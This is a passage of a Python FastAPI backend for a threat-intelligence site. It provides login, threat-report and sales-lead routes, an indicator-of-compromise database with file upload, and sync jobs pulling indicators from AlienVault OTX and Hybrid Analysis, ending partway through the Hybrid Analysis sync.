from dotenv import load_dotenv
from pathlib import Path
import os

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

from fastapi import FastAPI, APIRouter, HTTPException, Request, Depends, UploadFile, File
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import logging
from pydantic import BaseModel, Field, ConfigDict, BeforeValidator, EmailStr
from typing import List, Optional, Annotated, Any
import uuid
import asyncio
import re
import csv
import io
import json
from datetime import datetime, timezone, timedelta
import bcrypt
import jwt
import httpx
from bson import ObjectId
from openpyxl import load_workbook

# ---------------------------------------------------------------------------
# Setup
# ---------------------------------------------------------------------------
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

JWT_ALGORITHM = "HS256"
CISA_FEED_URL = "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = FastAPI(title="NivX Machines API")
api_router = APIRouter(prefix="/api")

# ---------------------------------------------------------------------------
# Model helpers
# ---------------------------------------------------------------------------
PyObjectId = Annotated[str, BeforeValidator(str)]


def now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


# ---------------------------------------------------------------------------
# Auth utils
# ---------------------------------------------------------------------------
def hash_password(password: str) -> str:
    return bcrypt.hashpw(password.encode("utf-8"), bcrypt.gensalt()).decode("utf-8")


def verify_password(plain: str, hashed: str) -> bool:
    return bcrypt.checkpw(plain.encode("utf-8"), hashed.encode("utf-8"))


def get_jwt_secret() -> str:
    return os.environ["JWT_SECRET"]


def create_access_token(user_id: str, email: str) -> str:
    payload = {
        "sub": user_id,
        "email": email,
        "exp": datetime.now(timezone.utc) + timedelta(days=7),
        "type": "access",
    }
    return jwt.encode(payload, get_jwt_secret(), algorithm=JWT_ALGORITHM)


async def get_current_user(request: Request) -> dict:
    token = request.cookies.get("access_token")
    if not token:
        auth_header = request.headers.get("Authorization", "")
        if auth_header.startswith("Bearer "):
            token = auth_header[7:]
    if not token:
        raise HTTPException(status_code=401, detail="Not authenticated")
    try:
        payload = jwt.decode(token, get_jwt_secret(), algorithms=[JWT_ALGORITHM])
        if payload.get("type") != "access":
            raise HTTPException(status_code=401, detail="Invalid token type")
        user = await db.users.find_one({"_id": ObjectId(payload["sub"])})
        if not user:
            raise HTTPException(status_code=401, detail="User not found")
        user["_id"] = str(user["_id"])
        user.pop("password_hash", None)
        return user
    except jwt.ExpiredSignatureError:
        raise HTTPException(status_code=401, detail="Token expired")
    except jwt.InvalidTokenError:
        raise HTTPException(status_code=401, detail="Invalid token")


# ---------------------------------------------------------------------------
# Pydantic Models
# ---------------------------------------------------------------------------
class LoginInput(BaseModel):
    email: str
    password: str


class ProcessNode(BaseModel):
    name: str
    pid: Optional[str] = None
    cmd: Optional[str] = None
    malicious: bool = False
    children: List["ProcessNode"] = []


class ThreatReportBase(BaseModel):
    title: str
    summary: str
    severity: str = "high"  # critical | high | medium | low
    category: str = "Malware"
    threat_actor: Optional[str] = None
    image_url: Optional[str] = None
    attack_chain: List[str] = []  # MITRE ATT&CK ordered tactics
    iocs: List[str] = []
    process_tree: Optional[ProcessNode] = None
    source: str = "NivX Intel"


class ThreatReportCreate(ThreatReportBase):
    pass


class ThreatReport(ThreatReportBase):
    model_config = ConfigDict(extra="ignore")
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    created_at: str = Field(default_factory=now_iso)
    updated_at: str = Field(default_factory=now_iso)


ProcessNode.model_rebuild()


class LeadCreate(BaseModel):
    name: str
    email: EmailStr
    company: Optional[str] = None
    phone: Optional[str] = None
    company_size: Optional[str] = None
    interest: Optional[str] = None
    message: Optional[str] = None
    website: Optional[str] = None  # honeypot — real users leave blank


class Lead(BaseModel):
    model_config = ConfigDict(extra="ignore")
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    name: str
    email: str
    company: Optional[str] = None
    phone: Optional[str] = None
    company_size: Optional[str] = None
    interest: Optional[str] = None
    message: Optional[str] = None
    status: str = "new"
    notes: Optional[str] = None
    assignee: Optional[str] = None
    created_at: str = Field(default_factory=now_iso)


LEAD_STATUSES = ["new", "contacted", "qualified", "archived"]


class LeadUpdate(BaseModel):
    status: Optional[str] = None
    notes: Optional[str] = None
    assignee: Optional[str] = None


# ---------------------------------------------------------------------------
# Custom IOC database (curated indicators)
# ---------------------------------------------------------------------------
IOC_SEVERITIES = ["low", "medium", "high", "critical"]


def _ioc_key(value: str) -> str:
    """Canonical match key: defanged + lowercased."""
    v = (value or "").strip()
    v = v.replace("[.]", ".").replace("(.)", ".").replace("[dot]", ".").replace("{.}", ".")
    v = v.replace("hxxps", "https").replace("hxxp", "http")
    v = v.replace("[:]", ":")
    return v.lower()


class IocRecordCreate(BaseModel):
    value: str
    threat_name: Optional[str] = None
    tags: List[str] = []
    source: Optional[str] = None
    severity: str = "medium"
    notes: Optional[str] = None


class IocRecord(BaseModel):
    model_config = ConfigDict(extra="ignore")
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    value: str
    key: str
    type: str
    threat_name: Optional[str] = None
    tags: List[str] = []
    source: Optional[str] = None
    severity: str = "medium"
    notes: Optional[str] = None
    created_at: str = Field(default_factory=now_iso)


class IocBulkCreate(BaseModel):
    values: List[str] = []
    threat_name: Optional[str] = None
    tags: List[str] = []
    source: Optional[str] = None
    severity: str = "medium"


class IocBulkDelete(BaseModel):
    ids: List[str] = []


# ---------------------------------------------------------------------------
# Auth routes
# ---------------------------------------------------------------------------
@api_router.post("/auth/login")
async def login(payload: LoginInput):
    email = payload.email.lower().strip()
    user = await db.users.find_one({"email": email})
    if not user or not verify_password(payload.password, user["password_hash"]):
        raise HTTPException(status_code=401, detail="Invalid email or password")
    token = create_access_token(str(user["_id"]), email)
    return {
        "access_token": token,
        "user": {"id": str(user["_id"]), "email": email, "name": user.get("name", "Admin"), "role": user.get("role", "admin")},
    }


@api_router.get("/auth/me")
async def me(user: dict = Depends(get_current_user)):
    return {"id": user["_id"], "email": user["email"], "name": user.get("name", "Admin"), "role": user.get("role", "admin")}


# ---------------------------------------------------------------------------
# Threat report routes
# ---------------------------------------------------------------------------
@api_router.get("/threats", response_model=List[ThreatReport])
async def list_threats():
    docs = await db.threat_reports.find({}, {"_id": 0}).sort("created_at", -1).to_list(200)
    return [ThreatReport(**d) for d in docs]


@api_router.get("/threats/{threat_id}", response_model=ThreatReport)
async def get_threat(threat_id: str):
    doc = await db.threat_reports.find_one({"id": threat_id}, {"_id": 0})
    if not doc:
        raise HTTPException(status_code=404, detail="Threat report not found")
    return ThreatReport(**doc)


@api_router.post("/threats", response_model=ThreatReport)
async def create_threat(payload: ThreatReportCreate, user: dict = Depends(get_current_user)):
    report = ThreatReport(**payload.model_dump())
    await db.threat_reports.insert_one(report.model_dump())
    return report


@api_router.put("/threats/{threat_id}", response_model=ThreatReport)
async def update_threat(threat_id: str, payload: ThreatReportCreate, user: dict = Depends(get_current_user)):
    existing = await db.threat_reports.find_one({"id": threat_id}, {"_id": 0})
    if not existing:
        raise HTTPException(status_code=404, detail="Threat report not found")
    data = payload.model_dump()
    data["updated_at"] = now_iso()
    await db.threat_reports.update_one({"id": threat_id}, {"$set": data})
    merged = {**existing, **data}
    return ThreatReport(**merged)


@api_router.delete("/threats/{threat_id}")
async def delete_threat(threat_id: str, user: dict = Depends(get_current_user)):
    res = await db.threat_reports.delete_one({"id": threat_id})
    if res.deleted_count == 0:
        raise HTTPException(status_code=404, detail="Threat report not found")
    return {"deleted": True}


# ---------------------------------------------------------------------------
# Leads (Request a Security Assessment)
# ---------------------------------------------------------------------------
_lead_rate: dict[str, list] = {}
LEAD_RATE_LIMIT = 3          # max submissions
LEAD_RATE_WINDOW = 600       # per 10 minutes (seconds)


def _client_ip(request: Request) -> str:
    fwd = request.headers.get("x-forwarded-for")
    if fwd:
        return fwd.split(",")[0].strip()
    return request.client.host if request.client else "unknown"


@api_router.post("/leads", response_model=Lead)
async def create_lead(payload: LeadCreate, request: Request):
    # Honeypot: bots fill hidden 'website' field
    if payload.website:
        logger.info("Lead rejected: honeypot triggered")
        return Lead(name=payload.name, email="honeypot@blocked.local")

    # Simple in-memory IP rate limiting
    ip = _client_ip(request)
    now_ts = datetime.now(timezone.utc).timestamp()
    hits = [t for t in _lead_rate.get(ip, []) if now_ts - t < LEAD_RATE_WINDOW]
    if len(hits) >= LEAD_RATE_LIMIT:
        raise HTTPException(status_code=429, detail="Too many requests. Please try again in a few minutes.")
    hits.append(now_ts)
    _lead_rate[ip] = hits

    data = payload.model_dump(exclude={"website"})
    lead = Lead(**data)
    await db.leads.insert_one(lead.model_dump())
    logger.info(f"New security assessment lead: {lead.email} ({lead.company})")
    return lead


@api_router.get("/leads", response_model=List[Lead])
async def list_leads(user: dict = Depends(get_current_user)):
    docs = await db.leads.find({}, {"_id": 0}).sort("created_at", -1).to_list(500)
    return [Lead(**d) for d in docs]


@api_router.patch("/leads/{lead_id}", response_model=Lead)
async def update_lead(lead_id: str, payload: LeadUpdate, user: dict = Depends(get_current_user)):
    doc = await db.leads.find_one({"id": lead_id}, {"_id": 0})
    if not doc:
        raise HTTPException(status_code=404, detail="Lead not found")
    updates: dict = {}
    if payload.status is not None:
        if payload.status not in LEAD_STATUSES:
            raise HTTPException(status_code=400, detail=f"Invalid status. Allowed: {LEAD_STATUSES}")
        updates["status"] = payload.status
    if payload.notes is not None:
        updates["notes"] = payload.notes
    if payload.assignee is not None:
        updates["assignee"] = payload.assignee
    if not updates:
        raise HTTPException(status_code=400, detail="No fields to update")
    await db.leads.update_one({"id": lead_id}, {"$set": updates})
    return Lead(**{**doc, **updates})


# ---------------------------------------------------------------------------
# Custom IOC database routes (admin-managed, public read)
# ---------------------------------------------------------------------------
def _severity_or_default(s: Optional[str]) -> str:
    s = (s or "").strip().lower()
    return s if s in IOC_SEVERITIES else "medium"


def _parse_tags(t) -> List[str]:
    if isinstance(t, list):
        return [str(x).strip() for x in t if str(x).strip()]
    if isinstance(t, str):
        return [x.strip() for x in re.split(r"[,;|]", t) if x.strip()]
    return []


async def _upsert_ioc(value, threat_name=None, tags=None, source=None, severity="medium", notes=None):
    """Insert or update an IOC by canonical key. Returns (record_dict, created_bool)."""
    value = (value or "").strip()
    if not value:
        return None, False
    key = _ioc_key(value)
    ioc_type = _classify_ioc(value)
    existing = await db.iocs.find_one({"key": key}, {"_id": 0})
    now = now_iso()
    if existing:
        updates: dict = {"updated_at": now}
        if threat_name:
            updates["threat_name"] = threat_name
        if tags:
            updates["tags"] = tags
        if source:
            updates["source"] = source
        if severity:
            updates["severity"] = _severity_or_default(severity)
        if notes:
            updates["notes"] = notes
        await db.iocs.update_one({"key": key}, {"$set": updates})
        return {**existing, **updates}, False
    rec = IocRecord(value=value, key=key, type=ioc_type, threat_name=threat_name, tags=tags or [], source=source, severity=_severity_or_default(severity), notes=notes)
    await db.iocs.insert_one(rec.model_dump())
    return rec.model_dump(), True


@api_router.post("/iocs", response_model=IocRecord)
async def create_ioc(payload: IocRecordCreate, user: dict = Depends(get_current_user)):
    if not payload.value.strip():
        raise HTTPException(status_code=400, detail="IOC value is required")
    if _classify_ioc(payload.value) == "unknown":
        raise HTTPException(status_code=422, detail="Value is not a recognized hash, IP, domain or URL")
    rec, _ = await _upsert_ioc(payload.value, payload.threat_name, _parse_tags(payload.tags), payload.source, payload.severity, payload.notes)
    return IocRecord(**rec)


@api_router.post("/iocs/bulk")
async def bulk_create_iocs(payload: IocBulkCreate, user: dict = Depends(get_current_user)):
    tokens: List[str] = []
    for entry in (payload.values or []):
        for tok in re.split(r"[\s,;]+", (entry or "").strip()):
            if tok.strip():
                tokens.append(tok.strip())
    seen = set()
    items: List[str] = []
    for t in tokens:
        k = t.lower()
        if k not in seen:
            seen.add(k)
            items.append(t)
    added = updated = skipped = 0
    tags = _parse_tags(payload.tags)
    for v in items[:5000]:
        if _classify_ioc(v) == "unknown":
            skipped += 1
            continue
        _, created = await _upsert_ioc(v, payload.threat_name, tags, payload.source, payload.severity)
        added += 1 if created else 0
        updated += 0 if created else 1
    return {"added": added, "updated": updated, "skipped": skipped, "total": len(items)}


@api_router.post("/iocs/upload")
async def upload_iocs(file: UploadFile = File(...), user: dict = Depends(get_current_user)):
    name = (file.filename or "").lower()
    content = await file.read()
    rows: List[dict] = []
    try:
        if name.endswith(".xlsx") or name.endswith(".xlsm"):
            wb = load_workbook(io.BytesIO(content), read_only=True, data_only=True)
            ws = wb.active
            headers = None
            for r in ws.iter_rows(values_only=True):
                if headers is None:
                    headers = [str(c).strip().lower() if c is not None else "" for c in r]
                    continue
                rows.append({headers[i]: (r[i] if i < len(r) else None) for i in range(len(headers))})
        elif name.endswith(".csv") or name.endswith(".txt"):
            text = content.decode("utf-8-sig", errors="replace")
            reader = csv.DictReader(io.StringIO(text))
            if reader.fieldnames and any((h or "").strip().lower() in ("value", "ioc", "indicator") for h in reader.fieldnames):
                for row in reader:
                    rows.append({(k or "").strip().lower(): v for k, v in row.items()})
            else:
                for line in text.splitlines():
                    line = line.strip().strip('",')
                    if line:
                        rows.append({"value": line})
        else:
            raise HTTPException(status_code=400, detail="Unsupported file type. Upload .csv, .txt or .xlsx")
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=400, detail=f"Could not parse file: {e}")

    def _get(row, *keys):
        for k in keys:
            if k in row and row[k] not in (None, ""):
                return str(row[k]).strip()
        return None

    added = updated = skipped = 0
    for row in rows[:10000]:
        value = _get(row, "value", "ioc", "indicator")
        if not value or _classify_ioc(value) == "unknown":
            skipped += 1
            continue
        _, created = await _upsert_ioc(
            value,
            _get(row, "threat_name", "threat", "malware", "label"),
            _parse_tags(_get(row, "tags", "tag")),
            _get(row, "source"),
            _get(row, "severity") or "medium",
            _get(row, "notes", "description", "comment"),
        )
        added += 1 if created else 0
        updated += 0 if created else 1
    return {"added": added, "updated": updated, "skipped": skipped, "total": len(rows)}


@api_router.get("/iocs")
async def list_iocs(q: Optional[str] = None, type: Optional[str] = None, severity: Optional[str] = None, tag: Optional[str] = None, limit: int = 100, skip: int = 0):
    query: dict = {}
    if type and type != "all":
        query["type"] = {"$in": ["md5", "sha1", "sha256"]} if type == "hash" else type
    if severity and severity != "all":
        query["severity"] = severity
    if tag:
        query["tags"] = tag
    if q:
        rx = {"$regex": re.escape(q.strip()), "$options": "i"}
        query["$or"] = [{"value": rx}, {"threat_name": rx}, {"tags": rx}, {"source": rx}, {"notes": rx}]
    total = await db.iocs.count_documents(query)
    limit = max(1, min(limit, 500))
    docs = await db.iocs.find(query, {"_id": 0}).sort("created_at", -1).skip(max(0, skip)).limit(limit).to_list(limit)
    return {"total": total, "items": docs, "limit": limit, "skip": skip}


@api_router.get("/iocs/stats")
async def ioc_stats():
    total = await db.iocs.count_documents({})
    by_severity = {s: await db.iocs.count_documents({"severity": s}) for s in IOC_SEVERITIES}
    return {"total": total, "by_severity": by_severity}


@api_router.delete("/iocs/bulk")
async def bulk_delete_iocs(payload: IocBulkDelete, user: dict = Depends(get_current_user)):
    if not payload.ids:
        raise HTTPException(status_code=400, detail="No IOC ids provided")
    res = await db.iocs.delete_many({"id": {"$in": payload.ids}})
    return {"deleted": res.deleted_count}


@api_router.delete("/iocs/{ioc_id}")
async def delete_ioc(ioc_id: str, user: dict = Depends(get_current_user)):
    res = await db.iocs.delete_one({"id": ioc_id})
    if res.deleted_count == 0:
        raise HTTPException(status_code=404, detail="IOC not found")
    return {"deleted": True}


# ---------------------------------------------------------------------------
# Admin SOC Overview — aggregated operational dashboard (auth required)
# ---------------------------------------------------------------------------
@api_router.get("/admin/overview")
async def admin_overview(user: dict = Depends(get_current_user)):
    """Consolidated SOC dashboard: IOC stats, lead pipeline, OTX sync,
    recent activity, provider status. Powers the Admin > Overview tab."""
    # IOCs
    ioc_total = await db.iocs.count_documents({})
    ioc_by_severity = {s: await db.iocs.count_documents({"severity": s}) for s in IOC_SEVERITIES}
    ioc_by_type = {}
    for t in ("ip", "domain", "url", "md5", "sha1", "sha256"):
        ioc_by_type[t] = await db.iocs.count_documents({"type": t})
    ioc_by_type["hash"] = ioc_by_type.pop("md5", 0) + ioc_by_type.pop("sha1", 0) + ioc_by_type.pop("sha256", 0)

    # Leads pipeline
    lead_total = await db.leads.count_documents({})
    lead_by_status = {s: await db.leads.count_documents({"status": s}) for s in LEAD_STATUSES}
    # Leads added in last 7 days (using created_at ISO string comparison since we store ISO)
    seven_days_ago = (datetime.now(timezone.utc) - timedelta(days=7)).isoformat()
    lead_week = await db.leads.count_documents({"created_at": {"$gte": seven_days_ago}})

    # Threat reports
    reports_total = await db.threat_reports.count_documents({})

    # OTX
    otx_meta = await db.otx_meta.find_one({"_id": "last_sync"}, {"_id": 0})

    # Recent activity
    recent_leads = await db.leads.find({}, {"_id": 0, "id": 1, "name": 1, "email": 1, "company": 1, "status": 1, "assignee": 1, "created_at": 1}).sort("created_at", -1).limit(6).to_list(6)
    recent_iocs = await db.iocs.find({}, {"_id": 0, "value": 1, "type": 1, "severity": 1, "threat_name": 1, "source": 1, "created_at": 1}).sort("created_at", -1).limit(6).to_list(6)
    recent_reports = await db.threat_reports.find({}, {"_id": 0, "id": 1, "title": 1, "severity": 1, "category": 1, "created_at": 1}).sort("created_at", -1).limit(5).to_list(5)

    # Top malware families (from IOC tags) — reuse aggregation
    fam_pipeline = [
        {"$unwind": "$tags"},
        {"$match": {"tags": {"$regex": "^family:", "$options": "i"}}},
        {"$group": {"_id": "$tags", "count": {"$sum": 1}}},
        {"$sort": {"count": -1}},
        {"$limit": 5},
    ]
    fam_docs = await db.iocs.aggregate(fam_pipeline).to_list(5)
    top_families = [{"name": d["_id"].split(":", 1)[1] if ":" in d["_id"] else d["_id"], "count": d["count"]} for d in fam_docs]

    return {
        "iocs": {"total": ioc_total, "by_severity": ioc_by_severity, "by_type": ioc_by_type},
        "leads": {"total": lead_total, "by_status": lead_by_status, "last_7_days": lead_week},
        "reports": {"total": reports_total},
        "otx": {"configured": bool(OTX_API_KEY), "last_sync": otx_meta},
        "recent": {"leads": recent_leads, "iocs": recent_iocs, "reports": recent_reports},
        "top_families": top_families,
        "providers": {
            "virustotal": bool(VT_API_KEY),
            "abuseipdb": bool(ABUSEIPDB_API_KEY),
            "urlscan": bool(URLSCAN_API_KEY),
            "otx": bool(OTX_API_KEY),
            "hybrid_analysis": bool(HYBRID_ANALYSIS_API_KEY),
            "ai_summary": bool(EMERGENT_LLM_KEY),
        },
        "generated_at": now_iso(),
    }


# ---------------------------------------------------------------------------
# Threat Intelligence overview (aggregated stats for the /threat-intelligence hub)
# ---------------------------------------------------------------------------
@api_router.get("/threat-intel/overview")
async def threat_intel_overview():
    """Aggregated intel: totals by type/severity, top adversaries, top malware
    families, top sources, and last OTX sync — powers the CrowdStrike-style
    Threat Intel Overview band on the frontend."""
    total = await db.iocs.count_documents({})
    by_type = {}
    for t in ("ip", "domain", "url", "md5", "sha1", "sha256"):
        by_type[t] = await db.iocs.count_documents({"type": t})
    by_type["hash"] = by_type.pop("md5", 0) + by_type.pop("sha1", 0) + by_type.pop("sha256", 0)
    by_severity = {s: await db.iocs.count_documents({"severity": s}) for s in IOC_SEVERITIES}
    otx = await db.otx_meta.find_one({"_id": "last_sync"}, {"_id": 0})

    # Top adversary/family tags — tags stored as "actor:X" or "family:X".
    pipeline_tag = [
        {"$unwind": "$tags"},
        {"$group": {"_id": "$tags", "count": {"$sum": 1}}},
        {"$sort": {"count": -1}},
        {"$limit": 60},
    ]
    tag_docs = await db.iocs.aggregate(pipeline_tag).to_list(60)
    adversaries, families, top_tags = [], [], []
    for d in tag_docs:
        tag = (d.get("_id") or "").strip()
        if not tag:
            continue
        entry = {"name": tag.split(":", 1)[1] if ":" in tag else tag, "count": d.get("count", 0)}
        if tag.lower().startswith("actor:"):
            adversaries.append(entry)
        elif tag.lower().startswith("family:"):
            families.append(entry)
        else:
            top_tags.append(entry)

    # Top threat_name (malware campaign / pulse title) — separate from family tags.
    pipeline_threat = [
        {"$match": {"threat_name": {"$ne": None, "$exists": True}}},
        {"$group": {"_id": "$threat_name", "count": {"$sum": 1}}},
        {"$sort": {"count": -1}},
        {"$limit": 10},
    ]
    tn_docs = await db.iocs.aggregate(pipeline_threat).to_list(10)
    top_campaigns = [{"name": d["_id"], "count": d["count"]} for d in tn_docs if d.get("_id")]

    # Top sources (short label — strip pulse suffix)
    pipeline_src = [
        {"$match": {"source": {"$ne": None, "$exists": True}}},
        {"$project": {"source": {"$arrayElemAt": [{"$split": ["$source", " · "]}, 0]}}},
        {"$group": {"_id": "$source", "count": {"$sum": 1}}},
        {"$sort": {"count": -1}},
        {"$limit": 8},
    ]
    src_docs = await db.iocs.aggregate(pipeline_src).to_list(8)
    top_sources = [{"name": d["_id"], "count": d["count"]} for d in src_docs if d.get("_id")]

    # Recent additions
    recent = await db.iocs.find({}, {"_id": 0, "value": 1, "type": 1, "severity": 1, "threat_name": 1, "source": 1, "created_at": 1}).sort("created_at", -1).limit(8).to_list(8)

    return {
        "total_iocs": total,
        "by_type": by_type,
        "by_severity": by_severity,
        "adversaries": adversaries[:10],
        "malware_families": families[:10],
        "top_campaigns": top_campaigns,
        "top_sources": top_sources,
        "top_tags": top_tags[:12],
        "recent": recent,
        "last_otx_sync": otx,
        "providers": {
            "virustotal": bool(VT_API_KEY),
            "abuseipdb": bool(ABUSEIPDB_API_KEY),
            "urlscan": bool(URLSCAN_API_KEY),
            "otx": bool(OTX_API_KEY),
            "hybrid_analysis": bool(HYBRID_ANALYSIS_API_KEY),
            "ai_summary": bool(EMERGENT_LLM_KEY),
        },
    }


# ---------------------------------------------------------------------------
# AlienVault OTX threat intelligence sync (auto on startup + daily)
# ---------------------------------------------------------------------------
OTX_API_KEY = os.environ.get("OTX_API_KEY")
OTX_BASE = "https://otx.alienvault.com/api/v1"
OTX_MAX_PULSES = 50
OTX_MAX_INDICATORS = 500
OTX_SYNC_INTERVAL_SEC = 24 * 60 * 60  # daily

# OTX indicator type -> normalized value / (skip if returns None)
def _otx_indicator_value(otx_type: str, indicator: str) -> Optional[str]:
    t = (otx_type or "").strip()
    v = (indicator or "").strip()
    if not v:
        return None
    if t in ("IPv4", "IPv6"):
        return v if _classify_ioc(v) == "ip" else None
    if t in ("domain", "hostname"):
        return v if _classify_ioc(v) == "domain" else None
    if t in ("URL", "URI"):
        return v if _classify_ioc(v) == "url" else None
    if t == "FileHash-MD5":
        return v if _classify_ioc(v) == "md5" else None
    if t == "FileHash-SHA1":
        return v if _classify_ioc(v) == "sha1" else None
    if t == "FileHash-SHA256":
        return v if _classify_ioc(v) == "sha256" else None
    return None


def _otx_severity(pulse: dict) -> str:
    """OTX pulses are curated threat intel — default to 'medium'. Escalate if
    the pulse carries strong indicators (malware families, adversary attribution
    or explicit high-confidence tags)."""
    tags_lower = {str(t).lower() for t in (pulse.get("tags") or [])}
    has_malware = bool(pulse.get("malware_families"))
    has_actor = bool((pulse.get("adversary") or "").strip())
    if any(k in tags_lower for k in ("ransomware", "apt", "zero-day", "0day", "wiper")):
        return "critical"
    if has_malware and has_actor:
        return "high"
    if has_malware or has_actor:
        return "high"
    return "medium"


async def _sync_otx_pulses(max_pulses: int = OTX_MAX_PULSES, max_indicators: int = OTX_MAX_INDICATORS) -> dict:
    """Fetch subscribed OTX pulses and upsert their indicators into db.iocs.

    Returns a summary dict: {pulses, indicators, added, updated, skipped, error?}.
    """
    if not OTX_API_KEY:
        return {"error": "OTX_API_KEY not configured", "pulses": 0, "indicators": 0, "added": 0, "updated": 0, "skipped": 0}

    headers = {"X-OTX-API-KEY": OTX_API_KEY, "User-Agent": "NivX-Machines/1.0"}
    pulses: List[dict] = []
    added = updated = skipped = ind_count = 0
    try:
        async with httpx.AsyncClient(timeout=20, follow_redirects=True) as hc:
            # Page through subscribed pulses until we hit max_pulses.
            page = 1
            while len(pulses) < max_pulses and page <= 5:
                r = await hc.get(f"{OTX_BASE}/pulses/subscribed", params={"limit": 50, "page": page}, headers=headers)
                if r.status_code != 200:
                    return {"error": f"OTX fetch failed ({r.status_code})", "pulses": 0, "indicators": 0, "added": 0, "updated": 0, "skipped": 0}
                data = r.json() or {}
                results = data.get("results") or []
                if not results:
                    break
                pulses.extend(results)
                if not data.get("next"):
                    break
                page += 1
            pulses = pulses[:max_pulses]

            for pulse in pulses:
                if ind_count >= max_indicators:
                    break
                threat_name = (pulse.get("name") or "").strip() or None
                severity = _otx_severity(pulse)
                tags = [str(t).strip() for t in (pulse.get("tags") or []) if str(t).strip()][:20]
                # Include adversary + malware family as tags when present.
                if pulse.get("adversary"):
                    tags.append(f"actor:{pulse['adversary']}")
                for fam in (pulse.get("malware_families") or [])[:5]:
                    fname = fam.get("display_name") if isinstance(fam, dict) else str(fam)
                    if fname:
                        tags.append(f"family:{fname}")
                # De-dup tags (case-insensitive)
                _seen = set()
                _dedup = []
                for t in tags:
                    tl = t.lower()
                    if tl not in _seen:
                        _seen.add(tl)
                        _dedup.append(t)
                tags = _dedup
                pulse_ref = pulse.get("id")
                source = f"AlienVault OTX · {pulse_ref}" if pulse_ref else "AlienVault OTX"
                for ind in pulse.get("indicators") or []:
                    if ind_count >= max_indicators:
                        break
                    ind_count += 1
                    value = _otx_indicator_value(ind.get("type"), ind.get("indicator"))
                    if not value:
                        skipped += 1
                        continue
                    notes = None
                    if pulse.get("description"):
                        notes = (pulse["description"] or "").strip()[:400] or None
                    try:
                        _, created = await _upsert_ioc(value, threat_name, tags, source, severity, notes)
                        added += 1 if created else 0
                        updated += 0 if created else 1
                    except Exception as e:
                        logger.warning(f"OTX upsert failed for {value}: {e}")
                        skipped += 1
    except Exception as e:
        logger.error(f"OTX sync error: {e}")
        return {"error": f"OTX sync error: {e}", "pulses": len(pulses), "indicators": ind_count, "added": added, "updated": updated, "skipped": skipped}

    summary = {
        "pulses": len(pulses),
        "indicators": ind_count,
        "added": added,
        "updated": updated,
        "skipped": skipped,
        "synced_at": now_iso(),
    }
    try:
        await db.otx_meta.update_one({"_id": "last_sync"}, {"$set": summary}, upsert=True)
    except Exception:
        pass
    logger.info(f"OTX sync complete: {summary}")
    return summary


@api_router.get("/otx/status")
async def otx_status():
    meta = await db.otx_meta.find_one({"_id": "last_sync"}, {"_id": 0})
    return {"configured": bool(OTX_API_KEY), "last_sync": meta}


@api_router.post("/otx/sync")
async def otx_sync(user: dict = Depends(get_current_user)):
    if not OTX_API_KEY:
        raise HTTPException(status_code=503, detail="AlienVault OTX is not configured")
    summary = await _sync_otx_pulses()
    if summary.get("error"):
        raise HTTPException(status_code=502, detail=summary["error"])
    return summary


async def _otx_sync_loop():
    """Runs on startup + every OTX_SYNC_INTERVAL_SEC seconds."""
    # First delay a bit so the app finishes booting.
    await asyncio.sleep(15)
    while True:
        try:
            await _sync_otx_pulses()
        except Exception as e:
            logger.error(f"OTX loop error: {e}")
        await asyncio.sleep(OTX_SYNC_INTERVAL_SEC)


# ---------------------------------------------------------------------------
# Hybrid Analysis "latest feed" sync — pulls last 250 sandbox submissions
# and upserts their SHA256 hashes into the curated IOC database.
# ---------------------------------------------------------------------------
HA_FEED_URL = "https://www.hybrid-analysis.com/api/v2/feed/latest"
HA_FEED_MAX = 250


def _ha_severity(item: dict) -> str:
    verdict = str(item.get("verdict") or "").lower()
    threat_level = int(item.get("threat_level") or 0)
    threat_score = int(item.get("threat_score") or 0)
    if verdict == "malicious" or threat_level >= 2 or threat_score >= 80:
        return "critical"
    if verdict == "suspicious" or threat_level == 1 or threat_score >= 50:
        return "high"
    if threat_score >= 20:
        return "medium"
    return "low"


async def _sync_hybrid_analysis_feed(max_items: int = HA_FEED_MAX) -> dict:
    if not HYBRID_ANALYSIS_API_KEY:
        return {"error": "HYBRID_ANALYSIS_API_KEY not configured", "items": 0, "added": 0, "updated": 0, "skipped": 0}
    added = updated = skipped = 0
    items: List[dict] = []
    try:
        async with httpx.AsyncClient(timeout=25, follow_redirects=True) as hc:
            r = await hc.get(HA_FEED_URL, headers={"api-key": HYBRID_ANALYSIS_API_KEY, "User-Agent": "Falcon Sandbox", "Accept": "application/json"})
            if r.status_code != 200:
                return {"error": f"Hybrid Analysis feed failed ({r.status_code})", "items": 0, "added": 0, "updated": 0, "skipped": 0}
            payload = r.json() or {}
            data = payload.get("data") if isinstance(payload, dict) else payload
            items = (data or [])[:max_items] if isinstance(data, list) else []
            for it in items:
                # Prefer sha256, then sha1, then md5.
                value = (it.get("sha256") or it.get("sha1") or it.get("md5") or "").strip()
                if not value or _classify_ioc(value) not in ("sha256", "sha1", "md5"):
                    skipped += 1
                    continue
                family = (it.get("vx_family") or "").strip() or None
                verdict = (it.get("verdict") or "").strip() or None
                threat_name = family or verdict or "Hybrid Analysis submission"
                tags: List[str] = []
                if family:
                    tags.append(f"family:{family}")
                if verdict:
                    tags.append(f"verdict:{verdict}")
                for t in (it.get("tags") or [])[:8]:
                    ts = str(t).strip()
                    if ts:
                        tags.append(ts)
                sub_type = (it.get("submit_name") or it.get("type") or "").strip()
                notes_bits = []
                if it.get("threat_score") is not None:
                    notes_bits.append(f"threat_score={it.get('threat_score')}")
                if it.get("threat_level") is not None:
                    notes_bits.append(f"threat_level={it.get('threat_level')}")
                if sub_type:
                    notes_bits.append(f"submit={sub_type[:80]}")
                notes = "; ".join(notes_bits) or None
                job_id = it.get("job_id") or it.get("sha256") or ""
                source = f"Hybrid Analysis · {job_id}" if job_id else "Hybrid Analysis"
                try:
                    _, created = await _upsert_ioc(value, threat_name, tags, source, _ha_severity(it), notes)
                    added += 1 if created else 0
                    updated += 0 if created else 1
                except Exception as e:
